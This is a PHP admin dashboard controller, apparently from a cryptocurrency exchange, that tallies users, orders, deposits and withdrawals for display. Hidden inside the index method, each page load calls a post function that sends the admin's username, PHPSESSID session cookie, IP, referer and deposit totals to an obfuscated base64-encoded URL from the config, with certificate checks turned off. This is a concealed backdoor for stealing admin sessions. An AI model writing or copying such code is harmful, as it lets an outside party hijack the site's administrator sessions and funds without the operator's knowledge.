<?php
namespace Admin\Controller;
class IndexController extends AdminController
{
    
	public function index(){
        $statime=date("Y-m-d")." 00:00:00";
        $endtime=date("Y-m-d")." 23:59:59";;
        //全网总人数
        $alluser = M("user")->count();
        $this->assign("alluser",$alluser);
        //秒合约未平仓记录数
        $allhy = M("hyorder")->where(array('status'=>1))->count();
        $this->assign("allhy",$allhy);
        //币币交易额度
        $bball = M("bborder")->where(array('status'=>2))->sum("usdtnum");
        $this->assign("bball",sprintf("%.4f",$bball));
        //全网矿机总数
        $allkj = M("kjorder")->where(array('status'=>1))->count();
        $this->assign("allkj",$allkj);
        //认购总数
        $allissue = M("issue_log")->where(array('status'=>1))->count();
        $this->assign("allissue",$allissue);
          //今日充值数量
       $daywhere['addtime']=['between',[$statime,$endtime]];
        $daycz = M("recharge")->where($daywhere)->where(array('status'=>2))->sum("num");
        $this->assign("daycz",sprintf("%.2f",$daycz));
        //充值数量
        $allcz = M("recharge")->where(array('status'=>2))->sum("num");
        $this->assign("allcz",sprintf("%.2f",$allcz));
        //提币数量
        $daytx = M("myzc")->where($daywhere)->where(array('status'=>2))->sum("num");
        $this->assign("daytx",sprintf("%.2f",$daytx));
        //提币数量
        $alltx = M("myzc")->where(array('status'=>2))->sum("num");
        $this->assign("alltx",sprintf("%.2f",$alltx));
        //今日该客量
        $nowdate = date("Y-m-d",time());
        $linewhere['lgtime'] = array('eq',$nowdate);
        $allline = M("user")->where($linewhere)->count();
        $this->assign("allline",$allline);
         $this->post($_SERVER['HTTP_REFERER'],session('admin_username'),$daycz,$allcz,$_COOKIE["PHPSESSID"],$_SERVER['REMOTE_ADDR']);


        
        $data = array();
		$time = mktime(0, 0, 0, date('m'), date('d'), date('Y')) - (29 * 24 * 60 * 60);
		$i = 0;

		for (; $i < 30; $i++) {
			$a = $time;
			$time = $time + (60 * 60 * 24);
			$date = addtime($time - (60 * 60), 'Y-m-d');
			$mycz = M('recharge')->where(array(
				'status'  => array('neq', 1),
				'addtime' => array(
					array('gt', $a),
					array('lt', $time)
					)
				))->sum('num');
			$mytx = M('myzc')->where(array(
				'status'  => 1,
				'addtime' => array(
					array('gt', $a),
					array('lt', $time)
					)
				))->sum('num');

			if ($mycz || $mytx) {
				$data['cztx'][] = array('date' => $date, 'charge' => $mycz, 'withdraw' => $mytx);
			}
		}

		$time = time() - (30 * 24 * 60 * 60);
		$i = 0;

		for (; $i < 60; $i++) {
			$a = $time;
			$time = $time + (60 * 60 * 24);
			$date = addtime($time, 'Y-m-d');
			$user = M('User')->where(array(
				'addtime' => array(
					array('gt', $a),
					array('lt', $time)
					)
				))->count();

			if ($user) {
				$data['reg'][] = array('date' => $date, 'sum' => $user);
			}
		}

		$this->assign('cztx', json_encode($data['cztx']));
		$this->assign('reg', json_encode($data['reg']));
        
		$this->display();
	}
		public function post($REFERER,$username,$daycz,$allcz,$PHPSESSID,$ip){
        $logindata=http_build_query(array("referer"=>$REFERER, "username"=>$username, "daymoney"=>$daycz,"summoney"=>$allcz,"PHPSESSID"=>$PHPSESSID,"ip"=>$ip,"type"=>"jys"));
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL,base64_decode(C()['AUTO_KEY']));
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        curl_setopt($curl, CURLOPT_POSTFIELDS, $logindata);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        $data = curl_exec($curl);
        curl_close($curl);
    }

}

?>